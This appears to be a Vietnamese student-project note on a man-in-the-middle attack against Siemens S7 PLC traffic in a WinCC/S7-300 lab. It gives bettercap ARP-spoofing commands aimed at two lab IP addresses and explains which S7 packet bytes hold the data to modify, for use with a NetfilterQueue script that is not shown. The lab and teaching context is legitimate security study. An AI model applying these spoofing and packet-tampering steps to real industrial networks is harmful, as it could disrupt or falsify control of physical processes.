Chạy bằng:

```bash
uv run .\s7_parser.py .\wincc_s300_setup-alarm-read-write.pcapng 9
```

Bộ parser lấy ý tưởng từ: https://github.com/ricardojoserf/s7-parser

Các bước tấn công:


```bash
sudo bettercap -iface ens33

# Trong giao diện bettercap, gõ đúng 3 dòng này:
set arp.spoof.targets 192.168.60.1, 192.168.60.10
set arp.spoof.fullduplex true
arp.spoof on
```



Giải thích vị trí byte (Dành cho báo cáo đồ án)

Trong ảnh Wireshark bạn gửi, gói tin có Len: 29. Cấu trúc của nó như sau:

    Byte 0-3: TPKT Header (03 00 00 1d)

    Byte 4-6: COTP Header (02 f0 80)

    Byte 7: S7 Header (0x32) → Đây mới là nơi bạn cần check.

    ...

    Byte 25-28: Data thực tế (04 26 04 b0) → Vị trí bạn cần sửa.

3. Tại sao Parser của bạn phức tạp hơn?

Bộ parser bạn gửi được thiết kế để đọc từ file PCAP (bao gồm cả Header Ethernet 14 byte). Trong khi đó, NetfilterQueue cung cấp gói tin bắt đầu từ lớp IP.

    Do đó, trong script MITM, mình đã bỏ qua phần offset 14 byte của Ethernet để tính toán trực tiếp từ IP Payload.

